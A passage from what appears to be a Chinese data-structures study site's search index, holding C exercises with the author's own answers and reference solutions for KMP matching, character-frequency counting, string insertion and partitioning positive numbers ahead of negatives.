1</code>\uff0c\u7136\u540e\u9012\u589e <code>i</code> \u548c <code>j</code>\u3002</li> <li>\u5982\u679c <code>T[i]</code> \u548c <code>T[j]</code> \u4e0d\u76f8\u7b49\uff0c\u5c06 <code>j</code> \u66f4\u65b0\u4e3a <code>next[j]</code> \u7684\u503c\uff0c\u76f4\u5230 <code>j</code> \u4e3a <code>-1</code> \u6216 <code>T[i]</code> \u548c <code>T[j]</code> \u76f8\u7b49\u3002\u7136\u540e\u5c06 <code>next[i+1]</code> \u8bbe\u7f6e\u4e3a <code>j + 1</code>\uff0c\u7136\u540e\u9012\u589e <code>i</code>\u3002</li> </ul> </li> <li>\u4f7f\u7528 <code>next</code> \u6570\u7ec4\u8fdb\u884c\u5b57\u7b26\u4e32\u5339\u914d\u3002</li> <li>\u521d\u59cb\u5316\u4e24\u4e2a\u6307\u9488 <code>i</code> \u548c <code>j</code>\uff0c\u5176\u4e2d <code>i = 0</code>\uff0c<code>j = 0</code>\u3002</li> <li>\u901a\u8fc7\u6bd4\u8f83 <code>S[i]</code> \u548c <code>T[j]</code> \u7684\u5b57\u7b26\u8fdb\u884c\u5339\u914d\uff1a<ul> <li>\u5982\u679c <code>S[i]</code> \u548c <code>T[j]</code> \u76f8\u7b49\uff0c\u5219\u9012\u589e <code>i</code> \u548c <code>j</code>\u3002</li> <li>\u5982\u679c <code>S[i]</code> \u548c <code>T[j]</code> \u4e0d\u76f8\u7b49\uff1a</li> <li>\u5982\u679c <code>j</code> \u4e3a <code>0</code>\uff0c\u8bf4\u660e\u5f53\u524d\u5b57\u7b26\u4e0d\u5339\u914d\u4e14\u65e0\u6cd5\u7ee7\u7eed\u56de\u9000\uff0c\u5c06 <code>i</code> \u9012\u589e\u3002</li> <li>\u5426\u5219\uff0c\u5c06 <code>j</code> \u66f4\u65b0\u4e3a <code>next[j]</code> \u7684\u503c\u3002</li> </ul> </li> <li>\u6839\u636e\u5339\u914d\u7684\u7ed3\u679c\u8fd4\u56de\u76f8\u5e94\u7684\u4f4d\u7f6e\u6216 <code>-1</code>\u3002</li> </ol> <p>\u4e0b\u9762\u662f\u5b8c\u6574\u7684\u4ee3\u7801\u5b9e\u73b0\uff1a</p> C<pre><code>int KMP(char *S, char *T) {\n    int len_s = strlen(S);\n    int len_t = strlen(T);\n\n    // \u6784\u5efa next \u6570\u7ec4\n    int next[len_t];\n    next[0] = -1;\n    int i = 0, j = -1;\n    while (i &lt; len_t - 1) {\n        if (j == -1 || T[i] == T[j]) {\n            i++;\n            j++;\n            next[i] = j;\n        } else {\n            j = next[j];\n        }\n    }\n\n    // \u4f7f\u7528 next \u6570\u7ec4\u8fdb\u884c\u5b57\u7b26\u4e32\u5339\u914d\n    i = 0;\n    j = 0;\n    while (i &lt; len_s &amp;&amp; j &lt; len_t) {\n        if (j == -1 || S[i] == T[j]) {\n            i++;\n            j++;\n        } else {\n            j = next[j];\n        }\n    }\n\n    if (j == len_t) {\n        return i - j + 1; // \u8fd4\u56de\u5339\u914d\u6210\u529f\u7684\u4f4d\u7f6e\n    } else {\n        return -1; // \u5339\u914d\u4e0d\u6210\u529f\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_15","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void Next(char* T, int* next) {\n    int i = 1;\n    next[1] = 0;\n    int j = 0;\n    while (i &lt; strlen(T)) {\n        if (j == 0 || T[i - 1] == T[j - 1]) {\n            i++;\n            j++;\n            next[i] = j;\n        }\n        else {\n            j = next[j];\n        }\n    }\n}\n\nint KMP(char* S, char* T) {\n    int next[10];\n    Next(T, next);\n    int i = 1;\n    int j = 1;\n    while (i &lt;= strlen(S) &amp;&amp; j &lt;= strlen(T)) {\n        if (j == 0 || S[i - 1] == T[j - 1]) {\n            i++;\n            j++;\n        }\n        else {\n            j = next[j];\n        }\n    }\n    if (j &gt; strlen(T)) {\n        return i - (int)strlen(T);\n    }\n    return -1;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_16","title":"\u7edf\u8ba1\u5b57\u7b26\u4e32\u4e2d\u5b57\u7b26\u9891\u5ea6","text":"<p>\u8bf7\u5b8c\u6210\u51fd\u6570<code>Account_char_count</code>\uff0c\u8be5\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\uff0c\u7edf\u8ba1\u5b57\u7b26\u4e32\u4e2d\u5404\u4e2a\u5b57\u7b26\u7684\u9891\u5ea6\uff0c\u5e76\u8f93\u51fa\u6bcf\u4e2a\u5b57\u7b26\u53ca\u5176\u9891\u5ea6\u3002\uff08\u5b57\u7b26\u4e32\u7684\u5408\u6cd5\u5b57\u7b26\u4e3a<code>A ~ Z</code>\u8fd9<code>26</code>\u4e2a\u5927\u5199\u5b57\u6bcd\u548c<code>0 ~ 9</code>\u8fd9<code>10</code>\u4e2a\u6570\u5b57\uff0c\u5176\u5b83\u5b57\u7b26\u5ffd\u7565\uff09\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_17","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u8f93\u5165\u5f85\u7edf\u8ba1\u7684\u5b57\u7b26\u4e32\uff08\u5408\u6cd5\u5b57\u7b26\u4e3aA~Z\u548c0~9\uff09\uff1a123321ASDDSA\n</code></pre> <p>\u8f93\u51fa\uff08\u8bf7\u6309\u6b64\u683c\u5f0f\u8f93\u51fa\uff09</p> Text Only<pre><code>1\u7684\u9891\u5ea6\u4e3a\uff1a2\n2\u7684\u9891\u5ea6\u4e3a\uff1a2\n3\u7684\u9891\u5ea6\u4e3a\uff1a2\nA\u7684\u9891\u5ea6\u4e3a\uff1a2\nS\u7684\u9891\u5ea6\u4e3a\uff1a2\nD\u7684\u9891\u5ea6\u4e3a\uff1a2\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_18","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#define SIZE 1000\n\nvoid Account_char_count(char str[]){\n     //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main(){\n     int i=0;\n     char str[SIZE];\n     printf(\"\u8bf7\u8f93\u5165\u5f85\u7edf\u8ba1\u7684\u5b57\u7b26\u4e32\uff08\u5408\u6cd5\u5b57\u7b26\u4e3aA~Z\u548c0~9\uff09\uff1a\");\n     while((str[i]=getchar())!='\\n')\n         i++;\n     str[i]='\\0';\n     Account_char_count(str);\n} \n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_19","title":"\u7b54\u6848","text":"<p>\u5148\u770b\u770b\u6211\u7b2c\u4e00\u6b21\u5199\u7684\uff0c\u901a\u4e0d\u8fc7\u68c0\u67e5\uff0c\u56e0\u4e3a\u8f93\u5165\u987a\u5e8f\u662f\u6309\u7167ABCD\u987a\u5e8f\uff0c\u800c\u975e\u9898\u76ee\u8f93\u5165\u987a\u5e8f\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#define SIZE 1000\n\nvoid Account_char_count(char str[]) {\n    int count[36] = { 0 };  // \u7528\u4e8e\u7edf\u8ba1\u5b57\u7b26\u9891\u5ea6\u7684\u6570\u7ec4\uff0c\u4e0b\u6807 0-25 \u5bf9\u5e94 A-Z\uff0c\u4e0b\u6807 26-35 \u5bf9\u5e94 0-9\n\n    for (int i = 0; str[i] != '\\0'; i++) {\n        char c = str[i];\n        if (c &gt;= 'A' &amp;&amp; c &lt;= 'Z') {\n            count[c - 'A']++;\n        }\n        else if (c &gt;= '0' &amp;&amp; c &lt;= '9') {\n            count[c - '0' + 26]++;\n        }\n    }\n\n    for (int i = 26; i &lt; 36; i++) {\n        if (count[i] != 0) {\n            printf(\"%c\u7684\u9891\u5ea6\u4e3a\uff1a%d\\n\", '0' + i - 26, count[i]);\n        }\n    }\n\n    for (int i = 0; i &lt; 26; i++) {\n        if (count[i] != 0) {\n            printf(\"%c\u7684\u9891\u5ea6\u4e3a\uff1a%d\\n\", 'A' + i, count[i]);\n        }\n    }\n\n}\n\nint main() {\n    int i = 0;\n    char str[SIZE];\n\n    printf(\"\u8bf7\u8f93\u5165\u5f85\u7edf\u8ba1\u7684\u5b57\u7b26\u4e32\uff08\u5408\u6cd5\u5b57\u7b26\u4e3aA~Z\u548c0~9\uff09\uff1a\");\n    while ((str[i] = getchar()) != '\\n') {\n        i++;\n    }\n    str[i] = '\\0';\n\n    Account_char_count(str);\n\n    return 0;\n}\n</code></pre> <p>\u6309\u7167\u8f93\u5165\u987a\u5e8f\u8f93\u51fa\u3002</p> C<pre><code>void Account_char_count(char str[]) {\n    int count[36] = { 0 };  // \u7528\u4e8e\u7edf\u8ba1\u5b57\u7b26\u9891\u5ea6\uff0c\u4e0b\u6807 0-25 \u5bf9\u5e94 A-Z\uff0c\u4e0b\u6807 26-35 \u5bf9\u5e94 0-9\n    int visited[36] = { 0 };  // \u8bb0\u5f55\u5b57\u7b26\u662f\u5426\u5df2\u7ecf\u8f93\u51fa\u8fc7\uff0c0\u8868\u793a\u6ca1\u6709\u8f93\u51fa\u8fc7\uff0c1\u8868\u793a\u8f93\u51fa\u8fc7\n\n    // \u7edf\u8ba1\u5b57\u7b26\u9891\u5ea6\n    for (int i = 0; str[i] != '\\0'; i++) {\n        char c = str[i];\n\n        if (c &gt;= 'A' &amp;&amp; c &lt;= 'Z') {\n            count[c - 'A']++;\n        }\n        else if (c &gt;= '0' &amp;&amp; c &lt;= '9') {\n            count[c - '0' + 26]++;\n        }\n    }\n\n    // \u8f93\u51fa\n    for (int i = 0; str[i] != '\\0'; i++) {\n        char c = str[i];\n\n        // \u8fd9\u91cc\u4f7f\u7528\u4e86\u4e00\u4e2a\u989d\u5916\u7684\u6570\u7ec4 visited \u6765\u8bb0\u5f55\u5b57\u7b26\u662f\u5426\u5df2\u7ecf\u8f93\u51fa\u8fc7\uff0c\u907f\u514d\u91cd\u590d\u8f93\u51fa\u76f8\u540c\u5b57\u7b26\u7684\u9891\u5ea6\u3002\n        // \u5728\u904d\u5386\u5b57\u7b26\u4e32\u65f6\uff0c\u5982\u679c\u9047\u5230\u4e00\u4e2a\u5b57\u7b26\u662f\u7b2c\u4e00\u6b21\u9047\u5230\u7684\u5b57\u7b26\uff0c\u5219\u8f93\u51fa\u5176\u9891\u5ea6\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684 visited \u6570\u7ec4\u6807\u8bb0\u4e3a\u5df2\u8f93\u51fa\u3002\n        // \u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1\u6309\u7167\u8f93\u5165\u5b57\u6bcd\u7684\u987a\u5e8f\u8f93\u51fa\u5b57\u7b26\u53ca\u5176\u9891\u5ea6\u3002\n        if (c &gt;= 'A' &amp;&amp; c &lt;= 'Z' &amp;&amp; !visited[c - 'A']) {\n            visited[c - 'A'] = 1;\n\n            printf(\"%c\u7684\u9891\u5ea6\u4e3a\uff1a%d\\n\", c, count[c - 'A']);\n        }\n        else if (c &gt;= '0' &amp;&amp; c &lt;= '9' &amp;&amp; !visited[c - '0' + 26]){\n            visited[c - '0' + 26] = 1;\n\n            printf(\"%c\u7684\u9891\u5ea6\u4e3a\uff1a%d\\n\", c, count[c - '0' + 26]);\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#ok","title":"\u6807\u51c6\u7b54\u6848\uff08\u6709\u70b9\u4e71\uff0c\u81ea\u5df1\u7684\u5c31OK\uff09","text":"C<pre><code>void Account_char_count(char str[]) {\n    char account_chr[SIZE];//\u5b58\u653e\u6bcf\u4e2a\u4e0d\u540c\u7684\u5b57\u7b26 \n    int count[SIZE] = { 0 };//\u521d\u59cb\u5316\u6bcf\u4e2a\u5b57\u7b26\u7684\u9891\u5ea6\u4e3a0 \n    int i, j, n = 0;//n\u8868\u793a\u5b57\u7b26\u79cd\u7c7b \n    for (i = 0; str[i] != '\\0'; i++) {\n        for (j = 0; j &lt; n; j++)\n            if (str[i] == account_chr[j] || (account_chr[j] &gt;= 'a' &amp;&amp; account_chr[j] &lt;= 'z' &amp;&amp; str[i] + 32 == account_chr[j]))\n                break;//\u5f80account_chr\u6570\u7ec4\u4e2d\u5b58\u653e\u7684\u5b57\u7b26\u4e0d\u53ef\u4ee5\u91cd\u590d \n        if (j &lt; n)\n            count[j]++;//\u5b57\u7b26\u51fa\u73b0\u8fc7\uff0c\u9891\u5ea6\u52a01 \n        else {\n            if (str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z')\n                account_chr[j] = str[i];\n            else\n                account_chr[j] = str[i];\n            count[j]++;\n            n++; //\u65b0\u5b57\u7b26\uff0c\u653e\u5230 account_chr\u4e2d\uff0c\u9891\u5ea6\u52a01 \n        }\n    }\n    for (i = 0; i &lt; n; i++)\n        printf(\"%c\u7684\u9891\u5ea6\u4e3a\uff1a%d\\n\", account_chr[i], count[i]);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_20","title":"\u5c06\u4e00\u6bb5\u5b57\u7b26\u63d2\u5165\u5230\u53e6\u4e00\u6bb5\u5b57\u7b26\u4e2d\u7684\u6307\u5b9a\u4f4d\u7f6e","text":"<p>\u7f16\u5199\u7b97\u6cd5\uff0c\u5b9e\u73b0\u4e0b\u9762\u51fd\u6570\u7684\u529f\u80fd\u3002\u51fd\u6570<code>void insert(char *s, char *t, int pos)</code>\u5c06\u5b57\u7b26\u4e32<code>t</code>\u63d2\u5165\u5230\u5b57\u7b26\u4e32<code>s</code>\u4e2d\uff0c\u63d2\u5165\u4f4d\u7f6e\u4e3a<code>pos</code>\uff0c\u63d2\u5165\u540e\u5b57\u7b26\u4e4b\u95f4\u4e0d\u80fd\u6709\u7a7a\u4f4d\u7f6e\u3002\u5047\u8bbe\u5206\u914d\u7ed9\u5b57\u7b26\u4e32<code>s</code>\u7684\u7a7a\u95f4\u8db3\u591f\u8ba9\u5b57\u7b26\u4e32<code>t</code>\u63d2\u5165\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_21","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32s\uff1a123\n\n\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32t\uff1aasd\n\n\u8f93\u5165\u63d2\u5165\u7684\u4f4d\u7f6e\uff08\u4f4d\u7f6e\u4ece1\u5f00\u59cb\uff09\uff1a2\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5b57\u7b26\u4e32\u63d2\u5165\u540e\u7684\u65b0\u5b57\u7b26\u4e32\u4e3a\uff1a1asd23\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_22","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define SIZE1 200\n#define SIZE2 50\n\nvoid insert(char *s, char *t, int pos){\n     //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n}\n\nint main(){ \n\n    char s[SIZE1], t[SIZE2];\n    int pos;\n\n    printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32s\uff1a\");\n    scanf(\"%s\", s); \n    printf(\"\\n\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32t\uff1a\");\n    scanf(\"%s\", t); \n\n    printf(\"\\n\u8f93\u5165\u63d2\u5165\u7684\u4f4d\u7f6e\uff08\u4f4d\u7f6e\u4ece1\u5f00\u59cb\uff09\uff1a\");\n    scanf(\"%d\", &amp;pos);\n    printf(\"\\n\u5b57\u7b26\u4e32\u63d2\u5165\u540e\u7684\u65b0\u5b57\u7b26\u4e32\u4e3a\uff1a\");\n    insert(s, t, pos);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_23","title":"\u7b54\u6848","text":"C<pre><code>void insert(char* s, char* t, int pos) {\n    int s_len = strlen(s);\n    int t_len = strlen(t);\n    int new_len = s_len + t_len;\n    int i, j;\n\n    pos--; // \u8bbe\u7f6e\u9996\u5143\u7d20\u4e0b\u6807\u4e3a\u20181\u2019\n\n    // \u5411\u53f3\u79fb\u52a8\u539f\u5b57\u7b26\u4e32s\u4e2d\u7684\u5b57\u7b26\uff0c\u7ed9\u63d2\u5165\u7684\u5b57\u7b26\u4e32t\u817e\u51fa\u7a7a\u95f4\n    for (i = s_len; i &gt;= pos; i--) {\n        s[i + t_len] = s[i];\n    }\n\n    // \u5c06\u5b57\u7b26\u4e32t\u63d2\u5165\u5230\u5b57\u7b26\u4e32s\u4e2d\n    for (j = 0; j &lt; t_len; j++) {\n        s[pos + j] = t[j];\n    }\n\n    // \u8f93\u51fa\u63d2\u5165\u540e\u7684\u65b0\u5b57\u7b26\u4e32\n    for (i = 0; i &lt; new_len; i++) {\n        printf(\"%c\", s[i]);\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_24","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>void insert(char* s, char* t, int pos) {\n    //\u5c06\u5b57\u7b26\u4e32\u63d2\u5165\u5230\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u6307\u5b9a\u4f4d\u7f6e\n\n    char* strs = s, * strt = t;\n\n    int i = 0;\n    while (*strs &amp;&amp; i &lt; pos - 1) {\n        strs++;\n        i++;\n    }\n    if (pos &lt; 1 || *strs == '\\0') {\n        printf(\"\u8f93\u5165\u7684pos\u503c\u9519\u8bef\uff01\\n\");\n        exit(0);\n    }//\u5224\u65ad\u662f\u5426\u8f93\u5165\u9519\u8bef\uff0c\u8f93\u5165\u9519\u8bef\u65f6\uff0c\u6b63\u5e38\u9000\u51fa \n\n    while (*strt != '\\0') {\n        strt++;//\u627e\u5230t\u5b57\u7b26\u4e32\u7684\u672b\u4f4d \n    }\n    strs = s + pos - 1;\n    while (*strs != '\\0') {\n        *(strt++) = *(strs++);//\u5c06\u5b57\u7b26\u4e32s\u7684pos\u540e\u7684\u5b57\u7b26\u653e\u5230t\u4e2d \n    }\n    strs = s + pos - 1;\n    while (*t != '\\0') {\n        *(strs++) = *(t++);//pos\u540e\u7684\u90e8\u5206\u653e\u56de\u539f\u4f4d\u7f6e \n    }\n    *strt = *strs = '\\0';//\u672b\u5c3e\u5236\u7a7a\n    printf(\"%s\", s);//\u8f93\u51fa\u5b57\u7b26\u4e32s \n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_25","title":"\u5c06\u6570\u7ec4\u4e2d\u7684\u6b63\u6570\u6392\u5728\u8d1f\u6570\u524d\u9762","text":"<p>\u8bbe\u4efb\u610f<code>n</code>\u4e2a\u6574\u6570\u5b58\u653e\u4e8e\u6570\u7ec4<code>A[1...n]</code>\u4e2d\uff0c\u8bd5\u7f16\u5199\u7b97\u6cd5\uff0c\u5b8c\u5584\u51fd\u6570<code>Change</code>\uff0c\u5c06\u6240\u6709\u6b63\u6570\u6392\u5728\u6240\u6709\u8d1f\u6570\u524d\u9762\uff08\u8981\u6c42\u7b97\u6cd5\u590d\u6742\u5ea6\u4e3a<code>O(n)</code>\uff09\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_26","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u8f93\u5165\u6570\u7ec4\u4e2d\u5143\u7d20\u4e2a\u6570\uff1a3\n\n\u8bf7\u8f93\u5165\u7b2c1\u4e2a\u5143\u7d20\u4e2a\u6570\uff1a-1\n\n\u8bf7\u8f93\u5165\u7b2c2\u4e2a\u5143\u7d20\u4e2a\u6570\uff1a2\n\n\u8bf7\u8f93\u5165\u7b2c3\u4e2a\u5143\u7d20\u4e2a\u6570\uff1a3\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u8c03\u6574\u6b21\u5e8f\u540e\u7684\u5143\u7d20\u5e8f\u5217\u4e3a\uff1a3 2 -1\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_27","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#define MAX 100\n\nvoid Change(int A[],int n){\n     //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n}\n\nint main(){\n    int A[MAX],i,n;\n    printf(\"\u8bf7\u8f93\u5165\u6570\u7ec4\u4e2d\u5143\u7d20\u4e2a\u6570\uff1a\");\n    scanf(\"%d\",&amp;n);\n    for(i=0;i&lt;n;i++){\n        printf(\"\\n\u8bf7\u8f93\u5165\u7b2c%d\u4e2a\u5143\u7d20\u4e2a\u6570\uff1a\",i+1);\n        scanf(\"%d\",&amp;A[i]);\n     }\n\n    Change(A,n);\n    printf(\"\\n\u8c03\u6574\u6b21\u5e8f\u540e\u7684\u5143\u7d20\u5e8f\u5217\u4e3a\uff1a\");\n    for(i=0;i&lt;n;i++)\n        printf(\"%d \",A[i]);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_28","title":"\u7b54\u6848","text":"<p>\u4f7f\u7528\u4e24\u4e2a\u6307\u9488\u6765\u5b9e\u73b0\u5c06\u6b63\u6570\u6392\u5728\u8d1f\u6570\u524d\u9762\u7684\u529f\u80fd\u3002\u4e00\u4e2a\u6307\u9488\u4ece\u6570\u7ec4\u7684\u5f00\u5934\u5f00\u59cb\uff0c\u53e6\u4e00\u4e2a\u6307\u9488\u4ece\u6570\u7ec4\u7684\u672b\u5c3e\u5f00\u59cb\u3002\u7136\u540e\uff0c\u4ea4\u6362\u4e24\u4e2a\u6307\u9488\u6307\u5411\u7684\u5143\u7d20\uff0c\u76f4\u5230\u4e24\u4e2a\u6307\u9488\u76f8\u9047\u3002\u8fd9\u6837\uff0c\u6b63\u6570\u5c31\u4f1a\u6392\u5728\u8d1f\u6570\u524d\u9762\u3002</p> <p>\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u662f O(n)\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u904d\u5386\u6570\u7ec4\u4e00\u6b21\u6765\u5c06\u6b63\u6570\u6392\u5728\u8d1f\u6570\u524d\u9762\u3002</p> <p>\u76f4\u63a5\u4e0aPOE\u5427\uff1a</p> <ol> <li> <p>\u521d\u59cb\u5316\u5de6\u6307\u9488 <code>left</code> \u4e3a\u6570\u7ec4\u7684\u5f00\u5934\uff08\u7d22\u5f15\u4e3a 0\uff09\uff0c\u53f3\u6307\u9488 <code>right</code> \u4e3a\u6570\u7ec4\u7684\u672b\u5c3e\uff08\u7d22\u5f15\u4e3a <code>n - 1</code>\uff09\u3002</p> </li> <li> <p>\u8fdb\u5165\u5faa\u73af\uff0c\u6761\u4ef6\u662f\u5de6\u6307\u9488\u5c0f\u4e8e\u53f3\u6307\u9488\u3002\u8fd9\u662f\u56e0\u4e3a\u5f53\u5de6\u6307\u9488\u548c\u53f3\u6307\u9488\u76f8\u9047\u65f6\uff0c\u610f\u5473\u7740\u5df2\u7ecf\u5b8c\u6210\u4e86\u6240\u6709\u5143\u7d20\u7684\u8c03\u6574\uff0c\u4e0d\u518d\u9700\u8981\u7ee7\u7eed\u4ea4\u6362\u3002</p> </li> <li> <p>\u5728\u5faa\u73af\u4e2d\uff0c\u5de6\u6307\u9488\u4ece\u6570\u7ec4\u7684\u5f00\u5934\u5f00\u59cb\u5411\u53f3\u79fb\u52a8\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u8d1f\u6570\u3002\u8fd9\u662f\u901a\u8fc7\u68c0\u67e5 <code>A[left] &gt; 0</code> \u6765\u5224\u65ad\u7684\u3002\u5982\u679c <code>A[left]</code> \u662f\u6b63\u6570\uff0c\u5c31\u7ee7\u7eed\u5411\u53f3\u79fb\u52a8\u5de6\u6307\u9488\u3002\u8fd9\u6837\uff0c\u5de6\u6307\u9488\u6700\u7ec8\u4f1a\u6307\u5411\u7b2c\u4e00\u4e2a\u8d1f\u6570\u6216\u8005\u6570\u7ec4\u7684\u672b\u5c3e\u3002</p> </li> <li> <p>\u5728\u5faa\u73af\u4e2d\uff0c\u53f3\u6307\u9488\u4ece\u6570\u7ec4\u7684\u672b\u5c3e\u5f00\u59cb\u5411\u5de6\u79fb\u52a8\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u6b63\u6570\u3002\u8fd9\u662f\u901a\u8fc7\u68c0\u67e5 <code>A[right] &lt; 0</code> \u6765\u5224\u65ad\u7684\u3002\u5982\u679c <code>A[right]</code> \u662f\u8d1f\u6570\uff0c\u5c31\u7ee7\u7eed\u5411\u5de6\u79fb\u52a8\u53f3\u6307\u9488\u3002\u8fd9\u6837\uff0c\u53f3\u6307\u9488\u6700\u7ec8\u4f1a\u6307\u5411\u7b2c\u4e00\u4e2a\u6b63\u6570\u6216\u8005\u6570\u7ec4\u7684\u5f00\u5934\u3002</p> </li> <li> <p>\u5982\u679c\u5de6\u6307\u9488\u5c0f\u4e8e\u53f3\u6307\u9488\uff0c\u8bf4\u660e\u627e\u5230\u4e86\u9700\u8981\u4ea4\u6362\u7684\u5143\u7d20\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4ea4\u6362\u5de6\u6307\u9488\u548c\u53f3\u6307\u9488\u6307\u5411\u7684\u5143\u7d20\u3002\u8fd9\u6837\u5c31\u5c06\u4e00\u4e2a\u6b63\u6570\u653e\u5728\u4e86\u8d1f\u6570\u7684\u524d\u9762\u3002</p> </li> <li> <p>\u91cd\u590d\u6b65\u9aa4 3 \u5230 5\uff0c\u76f4\u5230\u5de6\u6307\u9488\u548c\u53f3\u6307\u9488\u76f8\u9047\uff0c\u5b8c\u6210\u6240\u6709\u5143\u7d20\u7684\u8c03\u6574\u3002</p> </li> </ol> <p>\u8fd9\u4e2a\u7b97\u6cd5\u7684\u5173\u952e\u5728\u4e8e\u901a\u8fc7\u5de6\u6307\u9488\u5bfb\u627e\u8d1f\u6570\uff0c\u53f3\u6307\u9488\u5bfb\u627e\u6b63\u6570\uff0c\u7136\u540e\u4ea4\u6362\u5b83\u4eec\u7684\u4f4d\u7f6e\u3002\u901a\u8fc7\u4e0d\u65ad\u5411\u4e2d\u95f4\u79fb\u52a8\u6307\u9488\uff0c\u5e76\u5728\u9700\u8981\u4ea4\u6362\u65f6\u6267\u884c\u4ea4\u6362\u64cd\u4f5c\uff0c\u6700\u7ec8\u53ef\u4ee5\u5c06\u6240\u6709\u6b63\u6570\u6392\u5728\u8d1f\u6570\u524d\u9762\u3002 </p> C<pre><code>void Change(int A[], int n) {\n    int left = 0;  // \u5de6\u6307\u9488\n    int right = n - 1;  // \u53f3\u6307\u9488\n\n    while (left &lt; right) {\n        // \u5de6\u6307\u9488\u627e\u5230\u7b2c\u4e00\u4e2a\u8d1f\u6570\n        while (left &lt; right &amp;&amp; A[left] &gt; 0) {\n            left++;\n        }\n\n        // \u53f3\u6307\u9488\u627e\u5230\u7b2c\u4e00\u4e2a\u6b63\u6570\n        while (left &lt; right &amp;&amp; A[right] &lt; 0) {\n            right--;\n        }\n\n        // \u4ea4\u6362\u5de6\u53f3\u6307\u9488\u6307\u5411\u7684\u5143\u7d20\n        if (left &lt; right) {\n            int temp = A[left];\n            A[left] = A[right];\n            A[right] = temp;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_29","title":"\u6807\u51c6\u7b54\u6848\uff08\u90fd\u4e00\u6837\uff09","text":"C<pre><code>void Change(int A[], int n) {\n    //\u5c06\u6240\u6709\u6b63\u6570\u90fd\u6392\u5728\u8d1f\u6570\u524d\u9762\n    int i 